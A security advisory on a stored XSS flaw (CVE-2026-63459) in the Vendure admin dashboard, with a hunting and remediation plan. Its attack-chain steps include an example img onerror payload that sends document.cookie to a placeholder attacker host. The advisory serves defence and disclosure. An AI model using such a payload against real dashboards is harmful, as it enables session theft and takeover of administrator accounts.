---
title: Stored XSS in Vendure Admin Dashboard via Unsafe HTML Stripping
slug: 2026-09-vendure-xss
description: A stored Cross-Site Scripting (XSS) vulnerability in the Vendure Admin Dashboard allows authenticated administrators to execute arbitrary JavaScript in the context of other users viewing entity lists, leading to potential account takeover.
date: "2026-09-17T19:15:10Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:vendure:vendure:*:*:*:*:*:*:*:*
tags:
  - xss
  - web-vulnerability
  - dashboard
  - ecommerce
vendors:
  - Vendure
products:
  - Vendure Dashboard (< 3.6.5)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: a lower-privilege administrator can store a payload that executes in a higher-privilege administrator's browser when they open the corresponding list
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: a description containing <img src=x onerror=…> runs script when the element is parsed
    confidence_band: high
cves:
  - id: CVE-2026-63459
    cvss: 8.7
references:
  - https://github.com/advisories/GHSA-xhq9-whgq-49j5
  - https://nvd.nist.gov/vuln/detail/CVE-2026-63459
action_plan:
  priority: immediate_escalation
  owners:
    - IT Operations
    - SOC
  immediate_actions:
    - action: Upgrade @vendure/dashboard to version 3.6.5 or later
      owner: IT Operations
      due: 24h
      evidence: Source states vulnerable version is < 3.6.5
  hunt_leads:
    - lead: Search logs for unusual HTML tags or event handlers in entity descriptions
      technique_id: T1190
      data_needed:
        - Application audit logs
      priority: high
      confidence: high
      disposition: hunt_now
      evidence: Attacker stores a payload in the description field
  mitigation_plan:
    - priority: immediate
      action: Upgrade to version 3.6.5
      owner: IT Operations
      addresses: CVE-2026-63459
      evidence: Source identifies CVE-2026-63459 and version 3.6.5 fix
---

The Vendure e-commerce framework contains a high-severity stored Cross-Site Scripting (XSS) vulnerability, tracked as CVE-2026-63459, residing in the `@vendure/dashboard` package. The flaw exists within the `RichTextDescriptionCell` component, which is responsible for rendering entity descriptions in various administrative list views, including products, collections, promotions, payment methods, and shipping methods. 

The application attempts to strip HTML from user-supplied descriptions by assigning raw string input to the `innerHTML` property of a detached `div` element. Because browsers parse and execute active markup within `innerHTML` - even in detached nodes - payloads such as `<img>` tags with `onerror` event handlers trigger immediately upon assignment. This enables a lower-privileged channel-scoped administrator to inject malicious scripts that execute with the permissions of any administrator who views the list containing the payload. Successful exploitation leads to session hijacking, token exfiltration, or the unauthorized performance of administrative actions within the dashboard. The vulnerability affects all versions of `@vendure/dashboard` prior to 3.6.5.

## Attack Chain

1. Attacker gains access to an administrator account with at least catalog, promotion, or settings write permissions.
2. Attacker modifies a product, collection, or promotion entity description via the administrative API.
3. Attacker embeds a malicious payload within the description field using active markup, such as `<img src=x onerror="fetch('https://attacker.example/'+document.cookie)">`.
4. The application stores this malicious description string in the database as part of the entity configuration.
5. A high-privileged administrator (e.g., a superadmin) navigates to the administrative list view (e.g., Products, Promotions) in the Vendure dashboard.
6. The `RichTextDescriptionCell` component retrieves the malicious description and assigns it to a `div` element via `innerHTML` during the React rendering cycle.
7. The browser parses the `<img>` tag, fails to find the image source, and immediately executes the `onerror` JavaScript payload in the victim administrator's browser session.
8. The script exfiltrates the victim's session token or performs unauthorized actions, achieving account or store compromise.

## Impact

Successful exploitation allows for the compromise of high-privileged administrative accounts by lower-privileged administrators. This results in the loss of integrity and confidentiality for the e-commerce store, including potential unauthorized changes to products, pricing, or system configurations, and complete account takeover.

## Recommendation

* Upgrade Vendure to version 3.6.5 or later immediately to resolve the vulnerable `RichTextDescriptionCell` implementation.
* Audit administrative activity logs for unexpected `PATCH` or `POST` requests to product, collection, or promotion endpoints containing HTML tags or script-like patterns.
* Implement Content Security Policy (CSP) headers to restrict unauthorized script execution and `fetch` requests within the administrative dashboard interface.
* If immediate patching is not possible, restrict administrative write permissions for description fields to the minimum number of trusted users.
